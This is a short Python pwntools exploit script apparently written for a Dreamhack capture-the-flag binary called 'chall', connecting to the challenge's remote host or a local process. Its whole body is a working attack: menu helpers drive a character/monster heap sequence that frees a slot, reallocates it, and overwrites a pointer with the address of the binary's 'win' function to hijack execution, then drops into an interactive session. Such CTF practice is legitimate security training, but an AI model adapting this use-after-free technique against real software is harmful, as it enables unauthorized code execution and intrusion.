#!/usr/bin/python3

from pwn import *

exe = ELF("./chall")

context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())

def create(choose):
    sla(b'>> ', b'1')
    slna(b'Choose your character slot(1~3): ', choose)

def gen_char(choose, name, profile):
    sla(b'>> ', b'2')
    slna(b'Choose your character slot(1~3): ', choose)
    sla(b'name: ', name)
    sla(b'profile: ', profile)

def del_char(choose):
    sla(b'>> ', b'3')
    slna(b'Choose your character slot(1~3): ', choose)

def gen_monster():
    sla(b'>> ', b'4')

def slay_monster(choose):
    sla(b'>> ', b'5')
    slna(b'Choose your character slot(1~3): ', choose)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x0000000000401cdf
        b*0x0000000000401d32
        b*0x0000000000401e50
        c
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 12763)
else:
    p = process([exe.path])
GDB()
create(1)
gen_char(1, b'B', b'B'*40 + p64(exe.sym.win))
del_char(1)
gen_monster()
create(2)
gen_char(2, b'C', b'C')
slay_monster(2)




p.interactive()

